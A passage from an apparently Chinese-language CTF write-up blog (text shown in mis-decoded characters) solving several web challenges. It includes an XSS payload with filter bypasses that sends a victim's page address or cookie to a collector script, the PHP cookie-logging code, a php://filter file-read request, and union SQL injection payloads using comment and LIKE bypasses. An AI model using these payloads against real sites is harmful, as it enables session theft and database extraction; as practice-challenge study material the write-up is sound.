æ„¿æ„çŒ®ç¥­ä½ å…¨éƒ¨çš„ SSR æ¥è·å– flag å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$(<span class="string">&quot;#serv5&quot;</span>).<span class="title function_">html</span>() &amp;&amp; !$(<span class="string">&quot;#craft5&quot;</span>).<span class="title function_">html</span>()) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ä½ æ ¹æœ¬ä¸æ˜¯æ¬§æ´²äººã€‚&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;c&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;T&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;3&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;e&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;N&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (buy) &#123;</span><br><span class="line">        $(<span class="string">&quot;#serv5&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">        $(<span class="string">&quot;#craft5&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;å…‘æ¢æˆåŠŸã€‚flag: &quot;</span> + flag)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ä½ å¤±å»äº†å”¯ä¸€çš„æœºä¼šï¼Œæ˜å¹´å†æ¥å§ã€‚&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™å°±å¾ˆç®€å•äº†chrome,F12 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;c&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;T&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;3&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;e&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;N&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2017/10/1.png" /> ç„¶åå•Š...æœ‰ä¸ªå¤§ä½¬è¯´,ä»–æŠŠtimesç»™æ”¹äº†....ç„¶åå•æŠ½å‡ºå¥‡è¿¹....å¯ä»¥å¯ä»¥å‰å®³å‰å®³666... <img src="/images/2017/10/11.png" /></p><h3 id="ctfé€‰æ‰‹æ²¡æœ‰è§†åŠ›">3.CTFé€‰æ‰‹æ²¡æœ‰è§†åŠ›</h3><p>è¿™ä¸ªé¢˜æ²¡æœ‰åœ°å€äº†,å› ä¸ºå¹³å°å·²ç»å…³æ‰äº†,æˆ‘ä¹Ÿè¿›ä¸å»äº†,è¿™é“é¢˜å¥½åƒæ˜¯æŸå®¤å†…éƒ¨æˆå‘˜æ‰¾åˆ°åå°çš„ä¸€ä¸ªè§£é‡Šæ¼æ´(ä¸æ¸…æ¥šèƒ½ä¸èƒ½ç®—,æ¯•ç«Ÿæ˜¯åå°å˜›...),ç„¶åæŠŠè¾“å…¥æ¡†ææ²¡äº†,ç„¶ååªè¦æ¢å¤ä¸€ä¸‹å°±ok,ä½†flagæ˜¯åœ¨æºç é‡Œé¢,åæ­£ä¸éš¾</p><h3 id="æœ€ç®€å•çš„">4.æœ€ç®€å•çš„</h3><p>emmmmmè®°å¾—ä¸å¤ªæ¸…,ä½†ä¼¼ä¹æ˜¯å…³äºè¯·æ±‚çš„ä¸€ä¸ªé¢˜,åœ°å€æ‰¾äº†åŠå¤© <a href="http://jiejie.cyru1s.com/futa/">ä¼ é€é—¨</a> <img src="/images/2017/10/2.png" /> ç”¨çš„firefoxçš„hackbar,pythonå‘è¯·æ±‚æˆ–è€…burpæŠ“åŒ…ä¹Ÿå¯ä»¥</p><h3 id="æ¯”å…¥é—¨éš¾ä¸€ç‚¹">5.æ¯”å…¥é—¨éš¾ä¸€ç‚¹</h3><p>è®¿é—®index.php <img src="/images/2017/10/3.png" /> flagåœ¨èƒŒæ™¯ä¸­</p><h3 id="ä¸å¤ªè®°å¾—">6.7ä¸å¤ªè®°å¾—</h3><p>æœ‰ä¸€ä¸ªæ˜¯é›ªæ¢¨å§å§å’Œé’±å§å§çš„æ¯”èµ›,ç„¶åæ”¹cookieè¿‡(ä¼¼ä¹æ˜¯å‰é¢çš„æŸä¸ªè¿˜æ˜¯åé¢...ä¸è®°å¾—äº†),åæ­£ä¸æ˜¯å¾ˆéš¾....</p><h3 id="noway">8.noway</h3><p>è¿™é“é¢˜æˆ‘è®°å¾—,è¿™ä¸ªæ˜¯wechallä¸Šé¢çš„é¢˜,æŸ¥çœ‹.htaccessæ–‡ä»¶ <img src="/images/2017/10/4.png" /> æ²¡æœ‰banæ‰to,move,ç›´æ¥burpæŠ“ä¸ªåŒ…è¿‡,è€ƒç‚¹æ˜¯httpçš„è¯·æ±‚æ–¹å¼,è¯¦æƒ…çœ‹ä¸‹é¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">é€šè¿‡è¯·æ±‚URIå¾—åˆ°èµ„æº</span><br><span class="line">POST,</span><br><span class="line">ç”¨äºæ·»åŠ æ–°çš„å†…å®¹</span><br><span class="line">PUT</span><br><span class="line">ç”¨äºä¿®æ”¹æŸä¸ªå†…å®¹</span><br><span class="line">DELETE,</span><br><span class="line">åˆ é™¤æŸä¸ªå†…å®¹</span><br><span class="line">CONNECT,</span><br><span class="line">ç”¨äºä»£ç†è¿›è¡Œä¼ è¾“ï¼Œå¦‚ä½¿ç”¨SSL</span><br><span class="line">OPTIONS</span><br><span class="line">è¯¢é—®å¯ä»¥æ‰§è¡Œå“ªäº›æ–¹æ³•</span><br><span class="line">PATCH,</span><br><span class="line">éƒ¨åˆ†æ–‡æ¡£æ›´æ”¹</span><br><span class="line">PROPFIND, (wedav)</span><br><span class="line">æŸ¥çœ‹å±æ€§</span><br><span class="line">PROPPATCH, (wedav)</span><br><span class="line">è®¾ç½®å±æ€§</span><br><span class="line">MKCOL, (wedav)</span><br><span class="line">åˆ›å»ºé›†åˆï¼ˆæ–‡ä»¶å¤¹ï¼‰</span><br><span class="line">COPY, (wedav)</span><br><span class="line">æ‹·è´</span><br><span class="line">MOVE, (wedav)</span><br><span class="line">ç§»åŠ¨</span><br><span class="line">LOCK, (wedav)</span><br><span class="line">åŠ é”</span><br><span class="line">UNLOCK (wedav)</span><br><span class="line">è§£é”</span><br><span class="line">TRACE</span><br><span class="line">ç”¨äºè¿œç¨‹è¯Šæ–­æœåŠ¡å™¨</span><br><span class="line">HEAD</span><br><span class="line">ç±»ä¼¼äºGET, ä½†æ˜¯ä¸è¿”å›bodyä¿¡æ¯ï¼Œç”¨äºæ£€æŸ¥å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼Œä»¥åŠå¾—åˆ°å¯¹è±¡çš„å…ƒæ•°æ®</span><br></pre></td></tr></table></figure><p>apache2ä¸­ï¼Œå¯ä½¿ç”¨Limitï¼ŒLimitExceptè¿›è¡Œè®¿é—®æ§åˆ¶çš„æ–¹æ³•åŒ…æ‹¬ï¼šGET, POST, PUT, DELETE, CONNECT,OPTIONS, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, å’Œ UNLOCK. å…¶ä¸­ HEAD GET POST OPTIONS PROPFINDæ˜¯å’Œè¯»å–ç›¸å…³çš„æ–¹æ³•ï¼Œ MKCOL PUT DELETE LOCK UNLOCK COPY MOVE PROPPATCHæ˜¯å’Œä¿®æ”¹ç›¸å…³çš„æ–¹æ³• è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯phpä¼šå°†TOæ–¹æ³•ç»™è§£ææˆGETæ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠ“åŒ…ï¼Œæ”¹ä¸ºTOæ¥è¯·æ±‚index.php <img src="/images/2017/10/5.png" /> <img src="/images/2017/10/6.png" /></p><h3 id="charming-boy">9.Charming Boy</h3><p><a href="http://game.mitah.cn/charming_boy/index.php">ä¼ é€é—¨</a> è¿™é“é¢˜å°±æ˜¯ä¸ªxss,å†™ä¸ªpythonè·‘ä¸ªmd5,é¡ºä¾¿å‘ä¸ªpayloadè¿‡å»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&quot;http://game.mitah.cn/charming_boy/index.php&quot;</span>)</span><br><span class="line">start=r.text.find(<span class="string">&quot;substr(md5($code),0,4) = &quot;</span>)</span><br><span class="line">start+=<span class="built_in">len</span>(<span class="string">&#x27;substr(md5($code),0,4) = &#x27;</span>)</span><br><span class="line">code=r.text[start:start+<span class="number">4</span>]</span><br><span class="line">ok=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(md5(<span class="built_in">str</span>(each))[:<span class="number">4</span>])==<span class="built_in">str</span>(code):</span><br><span class="line">        ok=<span class="built_in">str</span>(each)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&#x27;message&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;Script&gt;document.write</span></span><br><span class="line"><span class="string">(&quot;&lt;iframe width=0 height=0</span></span><br><span class="line"><span class="string">src=&#x27;http://localhost/cookie.php?xss=&quot;+</span></span><br><span class="line"><span class="string">document.locatioonn.href</span></span><br><span class="line"><span class="string">+&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/iframe&gt;&quot;);&lt;/Script&gt;&#x27;&#x27;&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:ok&#125;</span><br><span class="line"></span><br><span class="line">r=u.post(<span class="string">&#x27;http://game.mitah.cn/charming_boy/post.php&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹scriptè¿‡æ»¤äº†,ç¬¬ä¸€æ¬¡æˆ‘æ£€æŸ¥çš„æ—¶å€™æŠŠscriptæ”¹æˆäº†scrscriptiptç„¶åè¿‡äº†alert,ä½†æ˜¯ä¼¼ä¹è¿‡iframeçš„æ—¶å€™æŒ‚äº†...å‘çš„ä¿¡æ¯å°±æ˜¯è®©ç›®æ ‡è¿›å…¥ç«™ç‚¹çš„æ—¶å€™è¯·æ±‚æˆ‘ä»¬çš„ç›®æ ‡åœ°å€æ¥åŠ è½½iframe,ç„¶åå°±ç”¨getçš„å‚æ•°å‘é€äº†cookie(æˆ–åœ°å€)åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š,ç„¶åè¿™é‡Œä»£ç å†™çš„æ˜¯åœ°å€,è¦æ”¹æˆcookieçš„è¯æŠŠä¸Šé¢çš„xss="+ document.locatioonn.href(locationé‡Œé¢çš„onè¢«è¿‡æ»¤äº†,ç”¨oonnç»•è¿‡)æ”¹æˆxss="+document.cookie æœåŠ¡å™¨ä¸Šé¢çš„cookie.phpä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str1</span>=<span class="variable">$_GET</span>[<span class="string">&quot;xss&quot;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$str1</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°è¯·æ±‚çš„åœ°å€ http://game.mitah.cn/charming_boy/H3r3_1s_tH3_f1a9.php å¸¦ä¸Šcookie <img src="/images/2017/10/7.png" /> å¾—åˆ°ç©ºé¡µé¢,çœ‹ä¸‹æºç ,æ‰¾åˆ°flag <img src="/images/2017/10/8.png" /></p><h3 id="charming-girls">10.Charming Girls</h3><p><a href="http://mitah.cn:20000/charming_girls/">ä¼ é€é—¨</a> éšä¾¿çœ‹ä¸‹,ç„¶åæ‰«äº†ä¸ªç›®å½•,å‘ç°index.php,login.phpä»€ä¹ˆçš„ ç„¶åæœ‰funåé¢æœ‰ç›¸åº”å‚æ•°,æˆ‘ä»¬ç”¨phpä¼ªåè®®è¯·æ±‚ä¸‹æ–‡ä»¶ å‘ç°indexä¸èƒ½è¯·æ±‚åˆ°,ç„¶åå…¶ä»–çš„é¡µé¢éƒ½æ²¡ä»€ä¹ˆç”¨,ä½†æ˜¯å› ä¸ºshowé¡µé¢æœ‰å›¾,çŒœæµ‹å­˜åœ¨æ•°æ®åº“é‡Œé¢, è¯·æ±‚ä¸€ä¸‹ http://mitah.cn:20000/charming_girls/?fun=php://filter/read=convert.base64-encode/resource=show&amp;id=1 ç„¶åå¾—åˆ°ä¸€ä¸²base64,è§£ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;connect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(andorunionselectupdatedeleteinsertfromwherelimitsleep</span></span><br><span class="line"><span class="string">countconcatrandfloorsubstrasciicharmidorder</span></span><br><span class="line"><span class="string">version\(\)database\(\)user\(\)\#\-\-\&#x27;\&quot;</span></span><br><span class="line"><span class="string">\=\*\&amp;\\`)/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(and.*\=.*or.*\=.*\&amp;\&amp;.*\=.*\\.*\=.*</span></span><br><span class="line"><span class="string">union selectselect.*from.*where</span></span><br><span class="line"><span class="string">limit .*,.*sleep(.*)if(.*)</span></span><br><span class="line"><span class="string">order by [0-9]*left(.*,.*)</span></span><br><span class="line"><span class="string">\`)/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/( \=)/i&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from pgg where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;table style=<span class="string">&quot;width:700px;height:300px;&quot;</span>&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th style=<span class="string">&quot;width:300px;height:300px;text-align:center;&quot;</span>&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;image/&lt;?php echo <span class="subst">$id</span>; ?&gt;.jpg&quot;</span> width=<span class="number">300</span> height=<span class="number">300</span> style=<span class="string">&quot;display:inline&quot;</span>&gt;</span><br><span class="line">    &lt;/th&gt;</span><br><span class="line">    &lt;th style=<span class="string">&quot;width:300px;height:300px;padding: 20px 20px 20px 30px;&quot;</span>&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; å§“å: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;name&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;name&#x27;</span>]:<span class="string">&quot;ä¸è¯¦&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; å¹´é¾„: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;age&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;age&#x27;</span>]:<span class="string">&quot;ä¸è¯¦&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; èº«é«˜: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;height&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;height&#x27;</span>]:<span class="string">&quot;ä¸è¯¦&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; ä¸‰å›´: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;bwh&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;bwh&#x27;</span>]:<span class="string">&quot;ä¸è¯¦&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">    &lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹è¿‡æ»¤äº†ä¸ªä¸ƒä¸ƒå…«å…«,ä½†å†ä¸€çœ‹,å¦‚æœå¯¹idåŒæ—¶getå’Œpost,å°±ç»•è¿‡äº†å¤§å¤šæ•°è¿‡æ»¤ ä½†æ˜¯æ³¨æ„ä»–å¯¹ç©ºæ ¼å’Œç­‰å·è¿›è¡Œäº†æ­£åˆ™åŒ¹é…,æˆ‘ä»¬ç©ºæ ¼ç”¨æ³¨é‡Šç»•,ç­‰å·ç”¨LIKEç»• æœ€åè¦æ³¨æ„çš„å°±æ˜¯,ä»–æŠŠå›æ˜¾ç»™å…³äº†,æ‰€ä»¥æ˜¯ä¸ªboolæ³¨,é‰´äºè·‘çš„ä¸œè¥¿å¤š,å†™ä¸ªè„šæœ¬,æˆ‘çš„è„šæœ¬æ—©å°±åˆ æ‰äº†,payloadå¤§æ¦‚é•¿æˆ <img src="/images/2017/10/9.png" /> è¿™é‡Œçœ‹å‡ºæ¥ä»–åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯å¤§äº101 <img src="/images/2017/10/10.png" /> è€Œä¸”è¿™ä¸ªå­—æ¯ä¸å¤§äº102 æ‰€ä»¥å°±æ˜¯102,å³f,ç„¶åå†™ä¸ªè„šæœ¬æ³¨å…¥ä¸‹å°±okäº†å‘— è¿™é‡Œè¦åæ§½ä¸‹,ç½‘ç«™åŠ è½½çš„è¶…çº§æ…¢,æ¯æ¬¡è¯·æ±‚è¦ç­‰å¥½ä¹…,åæ­£æœ€åå°±è·‘å‡ºflagäº†,ä¸æ‡‚çš„è¯<a href="http://localhost/2017/06/25/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">æ‰‹å·¥æ³¨å…¥ç¯‡</a> <strong>åè®°åè®°</strong> å¤ªèœäº†,è¿™é‡Œæ˜¯å¯ä»¥ç”¨unionæ³¨çš„,ä»£ç å¦‚ä¸‹.æ¢è¡Œæ˜¯ä¸ºäº†å¥½çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#çˆ†æ•°æ®è¡¨</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;(select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;table_schema/**/LIKE/**/&quot;pgg&quot;/**/limit/**/&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#+str(each)+&#x27;&#x27;&#x27;,1),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment">#çˆ†æ•°æ®åˆ—</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;(select/**/column_name/**/from/**/information_schema.columns/**/where/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;table_name/**/LIKE/**/&quot;fla9_14_h3r3&quot;/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;limit/**/&#x27;&#x27;&#x27;+str(each)+&#x27;&#x27;&#x27;,1),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment">#æ‹¿flag</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span 